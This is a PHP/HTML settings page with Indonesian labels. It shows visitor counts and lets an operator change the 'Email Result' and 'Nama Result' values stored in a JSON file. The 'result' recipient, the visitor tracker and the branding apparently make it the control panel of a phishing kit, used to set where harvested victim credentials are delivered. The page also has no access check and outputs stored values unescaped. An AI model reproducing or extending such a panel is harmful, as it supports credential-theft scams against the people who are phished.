<?php
// DATA.JSON
$ngGet = file_get_contents("system/data.json");
$data = json_decode($ngGet,true);

// VISITOR.JSON
$ngVis = file_get_contents("system/visitor.json");
$vis = json_decode($ngVis,true);

if(isset($_GET['change'])){
$ngGet = file_get_contents("system/data.json");
$data = json_decode($ngGet,true);
$ngResult = json_encode($data);
$ngFile = fopen('system/data.json','w');
           fwrite($ngFile,$ngResult);
           fclose($ngFile);
}
?>
<html>
 <head>
  <link rel="stylesheet" href="https://cdn.stackpath.web.id/asrest.css">
  <meta charset="UTF-8"> 
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"> 
  <meta http-equiv="X-UA-Compatible" content="IE=edge"> 
  <title>SETTING</title> 
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"> 
  <link rel="stylesheet" href="https://cdn.stackpath.web.id/style.css">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
  <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
      <link rel="stylesheet" href="https://cdn.stackpath.web.id/css/aset.css">
  </head>
<body>

<!-- MAS CODX -->

<body>
    <section>
        <header>
            <div class="l-icon">
                <i class="fa fa-sun-o" aria-hidden="true"></i>
            </div>
            <h1>SETTING</h1>
            <div class="r-icon">
                <i class="fa fa-sun-o" aria-hidden="true"></i>
            </div>
        </header>
        <div class="wrap">
            <div class="pemberitahuan" style="overflow:hidden;margin-top:10px;padding:2px;">
                <img style="border-radius:3px;max-width:100%;" src="https://cdn.stackpath.web.id/img/20251110_205123.jpg">
            </div>

            <!-- Formulir untuk Ganti Email Result -->
            <div class="formulir" id="change1" style="display:none;">
                <div class="form-group">
                    <span class="icon"><i class="fa fa-pencil" aria-hidden="true"></i></span>
                    <input type="email" id="ngEmail" class="form-input" placeholder="Contoh : emailmu@gmail.com" autocomplete="off">
                </div>
                <div style="margin-top:10px;" class="form-group" id="otp-btn">
                    <button id="btnEmail" type="submit" class="btn-send"><i class="fa fa-pencil-square-o" aria-hidden="true"></i>Ganti Email Result</button>
                </div>
            </div>

            <!-- Formulir untuk Ganti Nama Result -->
            <div class="formulir" id="change2" style="display:none;">
                <div class="form-group">
                    <span class="icon"><i class="fa fa-pencil" aria-hidden="true"></i></span>
                    <input type="email" id="ngNama" class="form-input" placeholder="Contoh : WEB CAHYO SR II" autocomplete="off">
                </div>
                <div style="margin-top:10px;" class="form-group" id="otp-btn">
                    <button id="btnNama" type="submit" class="btn-send"><i class="fa fa-pencil-square-o" aria-hidden="true"></i>Ganti Nama Result</button> 
              </div> 
              </div> 
              <div class="pemberitahuan"> 
              <div class="visitor"> 
              <span class="atas">Hari Ini</span> 
              <span class="bawah"><?php echo $vis['today'];?></span> 
              </div> 
              <div class="visitor"> 
              <span class="atas">Kemarin</span> 
              <span class="bawah"><?php echo $vis['yesterday'];?></span> 
              </div> 
              <div class="visitor"> 
              <span class="atas">Total</span> 
              <span class="bawah"><?php echo $vis['total'];?></span> 
              </div> 
              </div> 
               <div class="pemberitahuan"> 
                <span id="ubahEmail" class="change"><i class="fa fa-pencil-square-o" aria-hidden="true"></i>Ganti Email Result</span>
                <span id="ubahNama" class="change"><i class="fa fa-pencil-square-o" aria-hidden="true"></i>Ganti Nama Result</span>
            </div>

            <!-- Formulir untuk Data yang tidak bisa diubah -->
            <div class="formulir">
                <div class="form-group">
                    <span style="background:#91acda;" class="icon">Email Result</span>
                    <input style="background:#8c96d7;" type="text" id="valEmail" class="form-input" value="<?php echo $data['email_result']; ?>" readonly>
                </div>
                <div class="form-group" style="margin-top:10px;">
                    <span style="background:#91acda;" class="icon">Nama Result</span>
                    <input style="background:#8c96d7;" type="email" id="valNama" class="form-input" value="<?php echo $data['nama_result']; ?>" readonly>
                </div>
            </div>
        </div>
    </section>
    
    <script type="text/javascript">
        // Tampilkan formulir sesuai tombol
        $("#ubahEmail").click(function() {
            $("#change2").hide();
            $("#change1").fadeIn();
        });

        $("#ubahNama").click(function() {
            $("#change1").hide();
            $("#change2").fadeIn();
        });


        // Update Email (change4)
        $("#btnEmail").click(function() {
            var ngEmail = $("#ngEmail").val();
            $.post("system/UpdateData.php", { email_result: ngEmail }, function(ngE) {
                if (ngE === "Sukses") {
                    $("#valEmail").val(ngEmail);
                    swal("Berhasil!", "Email Result berhasil diperbarui!", "success");
                } else {
                    swal("Gagal!", "Terjadi kesalahan, silakan coba lagi.", "error");
                }
            });
        });

        // Update Nama Result (change5)
        $("#btnNama").click(function() {
            var ngNama = $("#ngNama").val();
            $.post("system/UpdateData.php", { nama_result: ngNama }, function(ngE) {
                if (ngE === "Sukses") {
                    $("#valNama").val(ngNama);
                    swal("Berhasil!", "Nama result berhasil diperbarui!", "success");
                } else {
                    swal("Gagal!", "Terjadi kesalahan, silakan coba lagi.", "error");
                }
            });
        });
    </script>
</body>
</html>